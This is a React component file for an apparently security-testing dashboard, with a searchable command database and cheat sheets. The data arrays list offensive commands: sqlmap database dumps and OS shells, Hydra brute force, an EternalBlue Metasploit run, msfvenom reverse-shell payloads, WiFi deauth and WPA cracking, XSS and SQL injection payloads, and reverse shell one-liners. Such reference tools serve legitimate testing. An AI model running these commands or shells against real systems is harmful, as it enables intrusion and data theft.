import { useState, useMemo } from "react";
import { motion } from "framer-motion";
import { ArrowLeft, Terminal, BookOpen, Copy, Check, Search, ChevronRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";

interface CommandEntry {
  cmd: string;
  desc: string;
  category: string;
}

interface CheatSection {
  title: string;
  color: string;
  items: { label: string; value: string }[];
}

function CopyLine({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      className="p-1.5 rounded text-muted-foreground hover:text-cyan transition-colors shrink-0" title="Copy command">
      {copied ? <Check className="size-3.5 text-emerald" /> : <Copy className="size-3.5" />}
    </button>
  );
}

function Shell({ onBack, icon, title, description, color, children }: {
  onBack: () => void; icon: React.ReactNode; title: string; description: string; color: string; children: React.ReactNode;
}) {
  return (
    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }} className="min-h-full">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        <Button variant="ghost" size="sm" onClick={onBack} className="gap-2 mb-6 text-muted-foreground hover:text-foreground">
          <ArrowLeft className="size-4" /> Back to Dashboard
        </Button>
        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className={`flex size-16 items-center justify-center rounded-2xl shrink-0 bg-${color}/10`}>{icon}</div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-3 mb-2 flex-wrap">
              <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">{title}</h1>
              <Badge variant="outline" className="text-xs border-emerald/40 text-emerald">Active</Badge>
            </div>
            <p className="text-muted-foreground text-base">{description}</p>
          </div>
        </div>
        {children}
      </div>
    </motion.div>
  );
}

/* ═══ Command Database ═══ */

const COMMANDS: CommandEntry[] = [
  // Nmap
  { cmd: "nmap -sV -sC -O target.com", desc: "Service/version detection, default scripts, OS fingerprint", category: "Nmap" },
  { cmd: "nmap -p- -T4 target.com", desc: "Scan all 65535 ports at speed T4", category: "Nmap" },
  { cmd: "nmap -sU --top-ports 100 target.com", desc: "Top 100 UDP ports", category: "Nmap" },
  { cmd: "nmap -sn 192.168.1.0/24", desc: "Ping sweep / host discovery on subnet", category: "Nmap" },
  { cmd: "nmap --script vuln target.com", desc: "Run NSE vulnerability scripts", category: "Nmap" },
  { cmd: "nmap -Pn -p 80,443,8080 --script http-* target.com", desc: "HTTP-focused NSE scripts", category: "Nmap" },
  { cmd: "nmap -iL targets.txt -oA scan_results", desc: "Scan from file, output all formats", category: "Nmap" },
  // SQLMap
  { cmd: "sqlmap -u \"https://site.com/page?id=1\" --batch --dbs", desc: "Auto-inject and list databases", category: "SQLMap" },
  { cmd: "sqlmap -r request.txt --batch --tables -D dbname", desc: "Test from saved request file, list tables", category: "SQLMap" },
  { cmd: "sqlmap -u URL --forms --level=3 --risk=2", desc: "Test all forms with deeper payloads", category: "SQLMap" },
  { cmd: "sqlmap -u URL --dump-all --threads=5", desc: "Dump everything from all tables", category: "SQLMap" },
  { cmd: "sqlmap -u URL --os-shell", desc: "Attempt to get an OS shell", category: "SQLMap" },
  { cmd: "sqlmap -u URL --tamper=space2comment,between", desc: "Apply WAF bypass tamper scripts", category: "SQLMap" },
  // Hydra
  { cmd: "hydra -l admin -P wordlist.txt ssh://target.com", desc: "SSH brute force with wordlist", category: "Hydra" },
  { cmd: "hydra -L users.txt -P pass.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", desc: "HTTP form brute force", category: "Hydra" },
  { cmd: "hydra -l admin -P wordlist.txt target.com ftp", desc: "FTP brute force", category: "Hydra" },
  { cmd: "hydra -C combo.txt rdp://target.com", desc: "RDP attack with user:pass combos", category: "Hydra" },
  // Nikto
  { cmd: "nikto -h https://target.com", desc: "Full web server scan", category: "Nikto" },
  { cmd: "nikto -h target.com -C all", desc: "Check all CGI directories", category: "Nikto" },
  { cmd: "nikto -h target.com -Tuning 1234567890", desc: "Enable all scan types", category: "Nikto" },
  // WPScan
  { cmd: "wpscan --url https://site.com --enumerate vp,vt,u", desc: "Enumerate vulnerable plugins, themes, users", category: "WPScan" },
  { cmd: "wpscan --url site.com --passwords rockyou.txt --usernames admin.txt", desc: "WordPress password attack", category: "WPScan" },
  { cmd: "wpscan --url site.com --api-token TOKEN", desc: "Use VulnDB API for vulnerability checks", category: "WPScan" },
  // Metasploit
  { cmd: "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run\"", desc: "Run EternalBlue from command line", category: "Metasploit" },
  { cmd: "use auxiliary/scanner/discovery/udp_sweep", desc: "UDP host discovery module", category: "Metasploit" },
  { cmd: "search type:exploit platform:windows eternalblue", desc: "Search the module database", category: "Metasploit" },
  { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe", desc: "Generate a reverse shell payload", category: "Metasploit" },
  { cmd: "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP -f raw > shell.php", desc: "Generate PHP meterpreter shell", category: "Metasploit" },
  // Burp Suite
  { cmd: "java -jar burpsuite_pro.jar --project-file=proj.burp", desc: "Open Burp with existing project", category: "Burp" },
  // Linux recon
  { cmd: "cat /etc/passwd", desc: "List system users", category: "Linux" },
  { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Find SUID binaries for privesc", category: "Linux" },
  { cmd: "sudo -l", desc: "List commands runnable with sudo", category: "Linux" },
  { cmd: "ss -tulnp", desc: "Show listening ports and owning processes", category: "Linux" },
  { cmd: "uname -a && cat /etc/os-release", desc: "Kernel and OS version info", category: "Linux" },
  { cmd: "getent passwd | awk -F: '$3>=1000 {print $1}'", desc: "List human user accounts", category: "Linux" },
  { cmd: "curl -s https://site.com | grep -oP '(?<=src=\")[^\"]+'", desc: "Extract script/resource URLs", category: "Linux" },
  // DNS / Subdomain
  { cmd: "dig +short A target.com @1.1.1.1", desc: "Quick A record lookup via Cloudflare", category: "DNS" },
  { cmd: "dig AXFR target.com @ns1.target.com", desc: "Attempt zone transfer", category: "DNS" },
  { cmd: "amass enum -passive -d target.com", desc: "Passive subdomain enumeration", category: "DNS" },
  { cmd: "subfinder -d target.com -silent", desc: "Fast passive subdomain discovery", category: "DNS" },
  { cmd: "gobuster dns -d target.com -w wordlist.txt", desc: "DNS brute forcing", category: "DNS" },
  // Gobuster / Dirb
  { cmd: "gobuster dir -u https://site.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt", desc: "Directory brute force with extensions", category: "Dirb" },
  { cmd: "feroxbuster -u https://site.com -w wordlist.txt --depth 3", desc: "Recursive content discovery", category: "Dirb" },
  { cmd: "dirb https://site.com /usr/share/wordlists/dirb/common.txt", desc: "Classic dirb scan", category: "Dirb" },
  // WiFi
  { cmd: "airmon-ng start wlan0", desc: "Enable monitor mode", category: "WiFi" },
  { cmd: "airodump-ng wlan0mon", desc: "Capture nearby APs and clients", category: "WiFi" },
  { cmd: "aireplay-ng -0 10 -a BSSID wlan0mon", desc: "Deauth test (authorized networks only)", category: "WiFi" },
  { cmd: "hashcat -m 22000 capture.22000 wordlist.txt", desc: "Crack WPA/WPA2 handshake (PMKID/EAPOL)", category: "WiFi" },
];

const COMMAND_CATEGORIES = ["All", ...Array.from(new Set(COMMANDS.map((c) => c.category)))];

export function CommandDatabase({ onBack }: { onBack: () => void }) {
  const [query, setQuery] = useState("");
  const [category, setCategory] = useState("All");
  const [expanded, setExpanded] = useState<string | null>(null);

  const filtered = useMemo(() => COMMANDS.filter((c) => {
    const mQ = !query || c.cmd.toLowerCase().includes(query.toLowerCase()) || c.desc.toLowerCase().includes(query.toLowerCase());
    const mC = category === "All" || c.category === category;
    return mQ && mC;
  }), [query, category]);

  return (
    <Shell onBack={onBack} icon={<Terminal className="size-8 text-cyan" />} color="cyan"
      title="Command Database" description={`${COMMANDS.length} reference commands across Nmap, SQLMap, Hydra, Metasploit, and more.`}>
      <div className="glass-card rounded-2xl p-5 mb-6">
        <div className="relative mb-4">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
          <Input value={query} onChange={(e) => setQuery(e.target.value)}
            placeholder="Search commands, flags, or descriptions..." className="pl-10 h-11" />
        </div>
        <div className="flex flex-wrap gap-1.5">
          {COMMAND_CATEGORIES.map((c) => (
            <button key={c} onClick={() => setCategory(c)}
              className={`px-3 py-1 rounded-full text-xs font-medium transition-all ${category === c ? "bg-cyan/10 text-cyan border border-cyan/30" : "bg-muted/30 text-muted-foreground border border-border/50 hover:bg-muted/50"}`}>
              {c}
            </button>
          ))}
        </div>
      </div>

      <div className="text-xs text-muted-foreground mb-3">{filtered.length} commands</div>

      <div className="glass-card rounded-2xl divide-y divide-border/30 overflow-hidden">
        {filtered.length === 0 ? (
          <div className="p-8 text-center text-sm text-muted-foreground">No commands match your search.</div>
        ) : filtered.map((c) => {
          const key = `${c.category}-${c.cmd}`;
          const isOpen = expanded === key;
          return (
            <div key={key} className="px-5 py-3 hover:bg-muted/20 transition-colors">
              <div className="flex items-start gap-3">
                <ChevronRight className={`size-4 mt-1 shrink-0 text-muted-foreground transition-transform ${isOpen ? "rotate-90" : ""}`} />
                <div className="flex-1 min-w-0 cursor-pointer" onClick={() => setExpanded(isOpen ? null : key)}>
                  <div className="flex items-center gap-2 flex-wrap">
                    <Badge variant="secondary" className="text-[9px] px-1.5 py-0">{c.category}</Badge>
                    <span className="text-[11px] text-muted-foreground">{c.desc}</span>
                  </div>
                  <code className="block text-xs font-mono text-emerald mt-1 break-all">{c.cmd}</code>
                </div>
                <CopyLine text={c.cmd} />
              </div>
            </div>
          );
        })}
      </div>
    </Shell>
  );
}

/* ═══ Cheat Sheets ═══ */

const CHEATS: CheatSection[] = [
  {
    title: "HTTP Status Codes", color: "#06b6d4",
    items: [
      { label: "200 OK", value: "Request succeeded, body returned" },
      { label: "301 / 302", value: "Permanent / temporary redirect" },
      { label: "401 / 403", value: "Unauthorized / Forbidden — auth exists" },
      { label: "404", value: "Not Found" },
      { label: "405", value: "Method Not Allowed — try other verbs" },
      { label: "500", value: "Internal Server Error — possible injection point" },
      { label: "503", value: "Service Unavailable — WAF or rate limit" },
    ],
  },
  {
    title: "XSS Payload Cheats", color: "#ef4444",
    items: [
      { label: "Basic script", value: "<script>alert(1)</script>" },
      { label: "Event handler", value: "<img src=x onerror=alert(1)>" },
      { label: "SVG onload", value: "<svg onload=alert(1)>" },
      { label: "Attribute breakout", value: "\" onmouseover=\"alert(1)" },
      { label: "javascript: URI", value: "<a href=\"javascript:alert(1)\">click</a>" },
      { label: "Encoded", value: "&lt;script&gt;alert(1)&lt;/script&gt;" },
      { label: "Template", value: "{{constructor.constructor('alert(1)')()}}" },
    ],
  },
  {
    title: "SQL Injection Cheats", color: "#f59e0b",
    items: [
      { label: "MySQL comment", value: "' OR '1'='1' -- " },
      { label: "UNION columns", value: "' UNION SELECT 1,2,3 -- " },
      { label: "Error based", value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- " },
      { label: "Time based (MySQL)", value: "' OR SLEEP(5) -- " },
      { label: "Boolean based", value: "' AND 1=1 -- " },
      { label: "Postgres", value: "' UNION SELECT NULL,version() -- " },
      { label: "MSSQL", value: "' WAITFOR DELAY '0:0:5' -- " },
    ],
  },
  {
    title: "Linux Privesc Quick Hits", color: "#22c55e",
    items: [
      { label: "SUID files", value: "find / -perm -4000 -type f 2>/dev/null" },
      { label: "Sudo rights", value: "sudo -l" },
      { label: "Cron jobs", value: "cat /etc/crontab; ls -la /etc/cron.*" },
      { label: "Kernel version", value: "uname -a" },
      { label: "Writable /etc/passwd", value: "ls -la /etc/passwd" },
      { label: "Capabilities", value: "getcap -r / 2>/dev/null" },
      { label: "PATH abuse", value: "echo $PATH; ls -la $(which command)" },
    ],
  },
  {
    title: "Bash / Reverse Shell One-Liners", color: "#8b5cf6",
    items: [
      { label: "Bash TCP", value: "bash -i >& /dev/tcp/IP/PORT 0>&1" },
      { label: "Python", value: "python -c 'import socket,pty,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" },
      { label: "Netcat", value: "nc -e /bin/bash IP PORT" },
      { label: "PHP", value: "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { label: "Listener", value: "nc -lvnp PORT" },
    ],
  },
  {
    title: "Base64 / Encoding Quick Ref", color: "#64748b",
    items: [
      { label: "Encode", value: "echo -n 'text' | base64" },
      { label: "Decode", value: "echo 'dGV4dA==' | base64 -d" },
      { label: "MD5", value: "echo -n 'text' | md5sum" },
      { label: "SHA-256", value: "echo -n 'text' | sha256sum" },
      { label: "Hash a file", value: "sha256sum file.ext" },
    ],
  },
  {
    title: "Burp Suite Shortcuts", color: "#f59e0b",
    items: [
      { label: "Send to Repeater", value: "Ctrl+R" },
      { label: "Send to Intruder", value: "Ctrl+I" },
      { label: "Go to previous/next tab", value: "Ctrl+Shift+[ / Ctrl+Shift+]" },
      { label: "Hex editor toggle", value: "Ctrl+Shift+H" },
      { label: "Request history search", value: "Ctrl+F" },
    ],
  },
];

export function CheatSheets({ onBack }: { onBack: () => void }) {
  const [query, setQuery] = useState("");
  const [copied, setCopied] = useState<string | null>(null);

  const filtered = useMemo(() => CHEATS.map((section) => ({
    ...section,
    items: section.items.filter((item) =>
      !query ||
      item.label.toLowerCase().includes(query.toLowerCase()) ||
      item.value.toLowerCase().includes(query.toLowerCase()) ||
      section.title.toLowerCase().includes(query.toLowerCase())
    ),
  })).filter((s) => s.items.length > 0), [query]);

  const copy = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const totalItems = filtered.reduce((sum, s) => sum + s.items.length, 0);

  return (
    <Shell onBack={onBack} icon={<BookOpen className="size-8 text-purple" />} color="purple"
      title="Cheat Sheets" description="Quick reference for HTTP codes, XSS/SQLi payloads, privesc, shells, and Burp shortcuts.">
      <div className="glass-card rounded-2xl p-5 mb-6">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
          <Input value={query} onChange={(e) => setQuery(e.target.value)}
            placeholder="Search cheatsheets... (e.g. sqli, suid, 403)" className="pl-10 h-11" />
        </div>
        <div className="text-[11px] text-muted-foreground mt-2">{totalItems} entries across {filtered.length} sections</div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {filtered.map((section) => (
          <motion.div key={section.title} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
            className="glass-card rounded-2xl overflow-hidden">
            <div className="px-5 py-3 border-b border-border/50 flex items-center gap-2"
              style={{ backgroundColor: `${section.color}10` }}>
              <div className="size-2 rounded-full" style={{ backgroundColor: section.color }} />
              <h3 className="text-sm font-semibold" style={{ color: section.color }}>{section.title}</h3>
              <span className="ml-auto text-[10px] text-muted-foreground">{section.items.length}</span>
            </div>
            <div className="divide-y divide-border/30">
              {section.items.map((item, i) => {
                const key = `${section.title}-${i}`;
                return (
                  <div key={key} className="px-5 py-2.5 flex items-start gap-3 hover:bg-muted/20 transition-colors">
                    <div className="flex-1 min-w-0">
                      <div className="text-[11px] font-medium text-muted-foreground">{item.label}</div>
                      <code className="block text-xs font-mono text-foreground mt-0.5 break-all">{item.value}</code>
                    </div>
                    <button onClick={() => copy(item.value, key)}
                      className="p-1.5 rounded text-muted-foreground hover:text-cyan transition-colors shrink-0">
                      {copied === key ? <Check className="size-3.5 text-emerald" /> : <Copy className="size-3.5" />}
                    </button>
                  </div>
                );
              })}
            </div>
          </motion.div>
        ))}
      </div>

      {filtered.length === 0 && (
        <div className="glass-card rounded-2xl p-10 text-center text-sm text-muted-foreground">
          No cheatsheet entries match your search.
        </div>
      )}
    </Shell>
  );
}
